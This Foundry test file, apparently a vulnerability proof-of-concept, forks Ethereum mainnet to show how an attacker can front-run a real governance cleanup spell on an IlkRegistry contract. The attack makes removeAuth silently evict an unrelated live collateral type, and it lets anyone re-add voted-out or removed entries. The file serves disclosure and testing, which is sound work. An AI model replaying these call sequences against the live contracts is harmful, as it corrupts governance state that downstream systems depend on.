// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import {Test} from "forge-std/Test.sol";

interface IlkRegistryLike {
    function vat() external view returns (address);
    function spot() external view returns (address);
    function dog() external view returns (address);
    function cat() external view returns (address);
    function wards(address) external view returns (uint256);
    function count() external view returns (uint256);
    function list() external view returns (bytes32[] memory);
    function get(uint256) external view returns (bytes32);
    function pos(bytes32) external view returns (uint256);
    function join(bytes32) external view returns (address);
    function pip(bytes32) external view returns (address);
    function xlip(bytes32) external view returns (address);
    function class(bytes32) external view returns (uint256);
    function add(address) external;
    function remove(bytes32) external;
    function removeAuth(bytes32) external;
}

interface JoinLike {
    function vat() external view returns (address);
    function ilk() external view returns (bytes32);
    function gem() external view returns (address);
    function dec() external view returns (uint256);
    function live() external view returns (uint256);
}

interface VatLike {
    function wards(address) external view returns (uint256);
    function ilks(bytes32) external view returns (
        uint256 Art,
        uint256 rate,
        uint256 spot,
        uint256 line,
        uint256 dust
    );
}

interface SpotLike {
    function ilks(bytes32) external view returns (address pip, uint256 mat);
}

interface DogLike {
    function ilks(bytes32) external view returns (address clip, uint256 chop, uint256 hole, uint256 dirt);
}

interface CatLike {
    function ilks(bytes32) external view returns (address flip, uint256 chop, uint256 dunk);
}

interface DssSpellLike {
    function cast() external;
    function done() external view returns (bool);
}

contract IlkRegistryRemovalRaceTest is Test {
    // The real cleanup spell was cast in block 23,118,264. This fork is the exact
    // state one block before execution, after the spell had already been scheduled.
    uint256 internal constant PRE_CAST_BLOCK = 23_118_263;

    // The real spell calls removeAuth 42 times: LSE-MKR-A plus the 41 legacy ilks
    // enumerated in the "Remove Offboarded ilks" governance section.
    uint256 internal constant SPELL_REMOVE_AUTH_CALLS = 42;

    address internal constant REGISTRY = 0x5a464C28D19848f44199D003BeF5ecc87d090F87;
    address internal constant CLEANUP_SPELL = 0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5;
    address internal constant AAVE_JOIN = 0x24e459F61cEAa7b1cE70Dbaea938940A7c5aD46e;
    address internal constant PAUSE_PROXY = 0xBE8E3e3618f7474F8cB1d074A26afFef007E98FB;

    bytes32 internal constant AAVE_A = "AAVE-A";
    bytes32 internal constant ETH_A = "ETH-A";

    address internal attacker = address(0xBEEF);
    address internal stranger = address(0xCAFE);

    IlkRegistryLike internal registry = IlkRegistryLike(REGISTRY);
    VatLike internal vat;

    function setUp() public {
        vm.createSelectFork("mainnet", PRE_CAST_BLOCK);
        vat = VatLike(registry.vat());
    }

    function _listed(bytes32 ilk) internal view returns (bool) {
        bytes32[] memory ilks = registry.list();
        for (uint256 i = 0; i < ilks.length; i++) {
            if (ilks[i] == ilk) return true;
        }
        return false;
    }

    function _castRealCleanupSpell() internal {
        DssSpellLike(CLEANUP_SPELL).cast();
        assertTrue(DssSpellLike(CLEANUP_SPELL).done(), "real executive spell did not finish");
    }

    /// @notice Negative control: without an attacker, the historical executive spell
    /// removes exactly the 42 ilks explicitly encoded in the spell.
    function testControlRealSpellRemovesOnlyIts42Targets() public {
        uint256 initialCount = registry.count();

        _castRealCleanupSpell();

        assertEq(
            registry.count(),
            initialCount - SPELL_REMOVE_AUTH_CALLS,
            "clean spell removed an unexpected number of entries"
        );
    }

    /// @notice A permissionless pre-removal makes the real governance spell remove
    /// an unrelated ilk because removeAuth() accepts a missing key and _remove()
    /// interprets the missing mapping entry's default pos as array index zero.
    function testRealSpellFrontRunSilentlyRemovesUnrelatedActiveIlk() public {
        assertEq(registry.join(AAVE_A), AAVE_JOIN, "AAVE-A must be registered before the real cleanup spell");
        assertEq(JoinLike(AAVE_JOIN).live(), 0, "AAVE-A join must already be caged");
        assertTrue(registry.class(AAVE_A) == 1 || registry.class(AAVE_A) == 2, "AAVE-A must be publicly removable");

        uint256 initialCount = registry.count();

        // Attacker uses the intentionally permissionless removal entrypoint during
        // the multi-day schedule-to-cast window.
        vm.prank(attacker);
        registry.remove(AAVE_A);
        assertEq(registry.count(), initialCount - 1, "attacker pre-removal failed");
        assertEq(registry.join(AAVE_A), address(0), "AAVE-A metadata should now be deleted");

        // This is the unrelated entry that removeAuth(AAVE-A) will silently evict.
        bytes32 unrelated = registry.get(0);
        address unrelatedJoin = registry.join(unrelated);
        (uint256 unrelatedArt,,, uint256 unrelatedLine,) = vat.ilks(unrelated);

        assertTrue(unrelated != AAVE_A, "victim must be unrelated to AAVE-A");
        assertTrue(unrelatedJoin != address(0), "victim must be a real registered ilk");
        assertTrue(unrelatedArt != 0 || unrelatedLine != 0, "victim must be economically active in Vat");
        assertTrue(_listed(unrelated), "victim must be enumerable before the spell");

        // Execute the actual August 7, 2025 executive spell, not a mock call.
        _castRealCleanupSpell();

        // Clean execution removes 42 targets. The attacker transaction causes one
        // additional pop when removeAuth(AAVE-A) operates on the now-missing key.
        assertEq(
            registry.count(),
            initialCount - SPELL_REMOVE_AUTH_CALLS - 1,
            "attack did not cause one extra unrelated removal"
        );

        // Mapping/array invariants are now broken: metadata still says the unrelated
        // ilk exists at pos 0, while list/get no longer contains it. Core Vat state
        // remains active, so list-based automation silently loses the live collateral.
        assertEq(registry.join(unrelated), unrelatedJoin, "victim metadata was unexpectedly deleted");
        assertEq(registry.pos(unrelated), 0, "victim keeps a stale position");
        assertFalse(_listed(unrelated), "victim was silently removed from enumeration");
        assertTrue(registry.get(0) != unrelated, "index zero was not replaced");

        (uint256 unrelatedArtAfter,,, uint256 unrelatedLineAfter,) = vat.ilks(unrelated);
        assertEq(unrelatedArtAfter, unrelatedArt, "attack unexpectedly changed victim Art");
        assertEq(unrelatedLineAfter, unrelatedLine, "attack unexpectedly changed victim line");
    }

    /// @notice Minimal reproduction of the same bug, independent of the historical
    /// spell's other actions.
    function testMissingRemoveAuthCorruptsArrayMappingConsistency() public {
        vm.prank(attacker);
        registry.remove(AAVE_A);

        bytes32 victim = registry.get(0);
        address victimJoin = registry.join(victim);
        (uint256 victimArt,,, uint256 victimLine,) = vat.ilks(victim);
        uint256 countBeforeAuthRemoval = registry.count();

        assertTrue(victimArt != 0 || victimLine != 0, "victim must be active");
        assertEq(registry.wards(PAUSE_PROXY), 1, "Pause Proxy must be a registry ward");

        vm.prank(PAUSE_PROXY);
        registry.removeAuth(AAVE_A); // AAVE-A is already absent.

        assertEq(registry.count(), countBeforeAuthRemoval - 1, "missing key still popped the array");
        assertEq(registry.join(victim), victimJoin, "victim mapping remains as a ghost entry");
        assertFalse(_listed(victim), "victim disappeared from list");
        assertEq(registry.pos(victim), 0, "victim position is stale");
    }

    /// @notice After the real governance cleanup, add() also accepts the caged AAVE
    /// adapter and reverses the explicit voted outcome that AAVE-A be removed.
    function testPermissionlessReAddReversesRealGovernanceCleanup() public {
        _castRealCleanupSpell();

        JoinLike join = JoinLike(AAVE_JOIN);
        assertEq(registry.join(AAVE_A), address(0), "spell must remove AAVE-A first");
        assertEq(join.vat(), address(vat), "legacy join still points at production Vat");
        assertEq(join.ilk(), AAVE_A, "legacy join still reports AAVE-A");
        assertEq(join.live(), 0, "legacy join is caged");
        assertEq(vat.wards(AAVE_JOIN), 1, "legacy join remains a Vat ward");

        (address spotPip,) = SpotLike(registry.spot()).ilks(AAVE_A);
        (address clip,,,) = DogLike(registry.dog()).ilks(AAVE_A);
        (address flip,,) = CatLike(registry.cat()).ilks(AAVE_A);
        assertTrue(spotPip != address(0), "Spotter still has a price feed");
        assertTrue(clip != address(0) || flip != address(0), "liquidation module still has an auction address");

        uint256 beforeCount = registry.count();
        vm.prank(attacker);
        registry.add(AAVE_JOIN);

        assertEq(registry.count(), beforeCount + 1, "attacker did not append AAVE-A");
        assertEq(registry.join(AAVE_A), AAVE_JOIN, "caged join was not restored");
        assertEq(registry.pip(AAVE_A), spotPip, "residual Spotter pip was not copied");
        assertEq(JoinLike(registry.join(AAVE_A)).live(), 0, "restored registry entry remains caged");
        assertTrue(_listed(AAVE_A), "voted-out ilk is enumerable again");
    }

    function testAnyoneCanToggleVotedOutIlkIndefinitely() public {
        _castRealCleanupSpell();
        uint256 originalCount = registry.count();

        vm.prank(attacker);
        registry.add(AAVE_JOIN);
        assertEq(registry.count(), originalCount + 1);

        vm.prank(stranger);
        registry.remove(AAVE_A);
        assertEq(registry.count(), originalCount);
        assertEq(registry.join(AAVE_A), address(0));

        vm.prank(attacker);
        registry.add(AAVE_JOIN);
        assertEq(registry.count(), originalCount + 1);
        assertEq(registry.join(AAVE_A), AAVE_JOIN);
    }

    function testReAddDoesNotReopenDebtButDoesRestoreVotedOutMetadata() public {
        _castRealCleanupSpell();

        (uint256 Art,,, uint256 line,) = vat.ilks(AAVE_A);
        assertEq(Art, 0, "AAVE-A has no normalized debt at the fork block");
        assertEq(line, 0, "AAVE-A has no debt ceiling at the fork block");

        vm.prank(attacker);
        registry.add(AAVE_JOIN);

        (uint256 ArtAfter,,, uint256 lineAfter,) = vat.ilks(AAVE_A);
        assertEq(ArtAfter, Art, "Registry.add must not mutate Vat debt");
        assertEq(lineAfter, line, "Registry.add must not mutate Vat line");
        assertEq(registry.join(AAVE_A), AAVE_JOIN, "governance-removed metadata was restored");
    }

    /// @notice Separate state-machine inconsistency: removeAuth can remove a live ilk,
    /// and permissionless add immediately reverses it because add checks Vat ward status
    /// but not Join.live().
    function testAuthorizedRemovalOfLiveIlkIsImmediatelyUndoable() public {
        address ethJoin = registry.join(ETH_A);
        assertTrue(ethJoin != address(0), "ETH-A must start registered");
        assertEq(JoinLike(ethJoin).live(), 1, "ETH-A join must be live");

        vm.prank(PAUSE_PROXY);
        registry.removeAuth(ETH_A);
        assertEq(registry.join(ETH_A), address(0), "authorized removal failed");

        vm.prank(attacker);
        registry.add(ethJoin);
        assertEq(registry.join(ETH_A), ethJoin, "unprivileged caller did not reverse authorized removal");
    }
}
